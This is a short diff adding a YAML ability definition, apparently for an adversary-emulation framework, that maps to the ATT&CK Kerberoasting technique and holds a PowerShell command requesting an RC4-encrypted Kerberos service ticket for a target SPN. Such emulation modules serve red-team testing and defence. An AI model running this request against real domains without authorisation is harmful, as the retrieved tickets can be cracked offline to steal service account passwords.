@@ -1,0 +1,18 @@
+id: fd8f1dfe-9ab2-4a60-9f75-810472d9bb22
+name: Request RC4 encrypted Kerberos TGS Service Ticket 
+description: Retrieves RC4 encrypted Kerberos TGS for a given SPN
+metadata:
+  version: 1
+  authors:
+    - w0rk3r
+  tags: []
+tactic: discovery
+technique:
+  id: T1558.003
+  name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+platforms:
+  windows:
+    psh:
+      command: |
+        Add-Type -AssemblyName System.IdentityModel
+        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '#{discover.spn}'
